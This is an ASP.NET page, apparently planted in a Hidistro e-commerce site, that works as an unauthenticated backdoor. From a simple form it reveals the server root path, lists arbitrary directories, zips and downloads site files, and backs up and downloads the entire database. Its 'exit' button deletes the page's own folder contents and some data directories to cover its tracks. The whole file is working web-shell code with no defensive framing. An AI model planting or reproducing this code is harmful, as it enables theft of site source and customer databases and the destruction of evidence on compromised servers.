<%@ Page Language="C#" %>

<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="Hidistro.Core" %>
<%@ Import Namespace="Ionic.Zip" %>
<%@ Import Namespace="Ionic.Zlib" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<% Label1.Text = AppDomain.CurrentDomain.BaseDirectory; %>
<script runat="server">   
    void AddDirFile2Zip(ZipFile zip, string dir)
    {
        if (File.Exists(dir))
        {
            zip.AddFile(dir);
            return;
        }
        if (!Directory.Exists(dir)) return;
        foreach (string file in Directory.GetFiles(dir))
        {
            if (File.Exists(file) && !zip.ContainsEntry(file))
            {
                FileStream fileStream = File.OpenRead(file);//打开压缩文件  
                byte[] buffer = new byte[fileStream.Length];
                fileStream.Read(buffer, 0, buffer.Length);
                zip.AddEntry(file, buffer);
                fileStream.Close();
            }
        }
    }
    protected void btnPackage_Click(object sender, EventArgs e)
    {
        string directoryName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, TextBox2.Text);
        al.Clear();
        
        GetAllDirList(directoryName);
        
        using (ZipFile zip = new ZipFile())
        {
            
            foreach (string item in al)
            {
                AddDirFile2Zip(zip, item);
            }
            Response.ContentType = "application/zip";
            Response.ContentEncoding = Encoding.Default;
            string outputfilename = Path.GetFileName(directoryName);
            if (string.IsNullOrEmpty(outputfilename)) outputfilename = "outputfile";
            Response.AddHeader("Content-Disposition", "attachment;filename=" + outputfilename + ".zip");
            Response.Clear();
            zip.Save(Response.OutputStream);
            Response.Flush();
            Response.Close();
            
        }
    }
    protected void Page_Load(object sender, EventArgs e)
    {
        Label1.Text = AppDomain.CurrentDomain.BaseDirectory;
    }
    //list dir
    protected void btnList_Click(object sender, EventArgs e)
    {
        string directoryName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, TextBox2.Text);
        foreach (string dir in Directory.GetDirectories(directoryName))
        {
            Response.Write(Path.GetFileName(dir) + "</br>");
        }
        foreach (string dir in Directory.GetFiles(directoryName))
        {
            Response.Write(Path.GetFileName(dir) + "</br>");
        }
    }
    public ArrayList al = new ArrayList();
    //我把ArrayList当成动态数组用，非常好用
    public void GetAllDirList(string strBaseDir)
    {
        if (File.Exists(strBaseDir))
        {
            al.Add(strBaseDir);
        }
        else if (Directory.Exists(strBaseDir))
        {
            //添加根目录
            al.Add(strBaseDir);
            DirectoryInfo di = new DirectoryInfo(strBaseDir);
            DirectoryInfo[] diA = di.GetDirectories();
            for (int i = 0; i < diA.Length; i++)
            {
                if (!diA[i].FullName.EndsWith("con.."))
                {
                    al.Add(diA[i].FullName);
                    //diA[i].FullName是某个子目录的绝对地址，把它记录在ArrayList中
                    GetAllDirList(diA[i].FullName);
                    //注意：递归了。逻辑思维正常的人应该能反应过来
                }
            }
        }
    }
    //delete self
    protected void btnSelfDelete_Click(object sender, EventArgs e)
    {
        createDataDir();
        string data = Request.MapPath("~\\storage\\data\\taobao\\data.zip");
        if (File.Exists(data))
        {
            File.Delete(data);
        }
        data = Request.MapPath("~\\storage\\data\\paipai\\data.zip");
        if (File.Exists(data))
        {
            File.Delete(data);
        }
        string path = Path.GetDirectoryName(Request.PhysicalPath);
        if (Directory.Exists(path))
        {
            foreach (string file in Directory.GetFiles(path))
            {
                File.Delete(file);
            }
        }
        path = Request.MapPath("~\\storage\\data\\paipai\\data");
        if (Directory.Exists(path))
        {
            Directory.Delete(path);
        }
        path = Request.MapPath("~\\storage\\data\\taobao\\data");
        if (Directory.Exists(path))
        {
            Directory.Delete(path);
        }
        Response.Redirect("~/default.aspx");
    }
    void createDataDir()
    {
        string tbDir = Request.MapPath("~\\storage\\data\\taobao\\");
        if (!Directory.Exists(tbDir))
        { Directory.CreateDirectory(tbDir); }
        string ppDir = Request.MapPath("~\\storage\\data\\paipai\\");
        if (!Directory.Exists(ppDir))
        { Directory.CreateDirectory(ppDir); }
    }
    protected void btnBackup_Click(object sender, EventArgs e)
    {
        string path = Path.GetDirectoryName(Request.PhysicalPath);
        string databaseName;
        Microsoft.Practices.EnterpriseLibrary.Data.Database database = Microsoft.Practices.EnterpriseLibrary.Data.DatabaseFactory.CreateDatabase();
        using (System.Data.Common.DbConnection connection = database.CreateConnection())
        {
            databaseName = connection.Database;
        }
        string backupfile = databaseName + "_" + DateTime.Now.ToString("yyyyMMddHHmmss") + ".bak";
        System.Data.Common.DbCommand sqlStringCommand = database.GetSqlStringCommand(string.Format("backup database [{0}] to disk='{1}'", databaseName, path + "\\" + backupfile));
        database.ExecuteNonQuery(sqlStringCommand);
        using (ZipFile zip = new ZipFile())
        {
            zip.AddFile(path + "\\" + backupfile);
            Response.ContentType = "application/zip";
            Response.ContentEncoding = Encoding.Default;
            string outputfilename = Path.GetFileName(path);
            if (string.IsNullOrEmpty(outputfilename)) outputfilename = "outputfile";
            Response.AddHeader("Content-Disposition", "attachment;filename=" + outputfilename + ".zip");
            Response.Clear();
            zip.Save(Response.OutputStream);
            Response.Flush();
            Response.Close();
        }
    }
</script>
<html xmlns="http://www.w3.org/1999/xhtml">
<body>
    <form id="form1" runat="server">
    <div>
        root:<asp:Label ID="Label1" runat="server" Text="Label"></asp:Label>
        <br />
        path：\<asp:TextBox ID="TextBox2" runat="server" Text="" Width="307px"></asp:TextBox>(specify
        path 2 package)
    </div>
    <asp:Button ID="btnPackage" runat="server" OnClick="btnPackage_Click" Text="web package" />
    <asp:Button ID="btnList" runat="server" OnClick="btnList_Click" Text="list" />
    <asp:Button ID="btnBackup" runat="server" OnClick="btnBackup_Click" Text="backup" />&nbsp;&nbsp;&nbsp;&nbsp;-->
    <asp:Button ID="btnSelfDelete" runat="server" OnClick="btnSelfDelete_Click" Text="exit" />
    </form>
</body>
</html>
